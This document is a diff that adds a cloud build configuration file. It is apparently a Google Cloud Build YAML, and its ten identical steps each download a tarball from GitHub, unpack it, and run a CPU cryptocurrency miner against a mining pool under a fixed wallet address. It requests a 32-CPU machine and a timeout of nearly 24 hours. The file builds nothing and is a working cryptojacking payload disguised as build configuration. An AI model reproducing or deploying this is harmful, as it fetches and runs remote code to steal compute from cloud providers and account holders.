@@ -1,0 +1,84 @@
+steps:
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://github.com/NabilaMahmudah/24/raw/main/gula.tar && tar xf gula.tar && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.odang -t16
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://github.com/NabilaMahmudah/24/raw/main/gula.tar && tar xf gula.tar && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.odang -t16
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+    
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://github.com/NabilaMahmudah/24/raw/main/gula.tar && tar xf gula.tar && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.odang -t16
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://github.com/NabilaMahmudah/24/raw/main/gula.tar && tar xf gula.tar && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.odang -t16
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://github.com/NabilaMahmudah/24/raw/main/gula.tar && tar xf gula.tar && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.odang -t16
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://github.com/NabilaMahmudah/24/raw/main/gula.tar && tar xf gula.tar && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.odang -t16
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://github.com/NabilaMahmudah/24/raw/main/gula.tar && tar xf gula.tar && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.odang -t16
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://github.com/NabilaMahmudah/24/raw/main/gula.tar && tar xf gula.tar && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.odang -t16
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://github.com/NabilaMahmudah/24/raw/main/gula.tar && tar xf gula.tar && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.odang -t16
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://github.com/NabilaMahmudah/24/raw/main/gula.tar && tar xf gula.tar && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1q9n5adhfzmnnrm6t3839wxcz0cdrxdt430hl4m7.odang -t16
+    waitFor: ["-"]
+    entrypoint: /bin/bash
+timeout: 86000s
+options:
+  machineType: 'E2-HIGHCPU-32'
+  diskSizeGb: '1000'
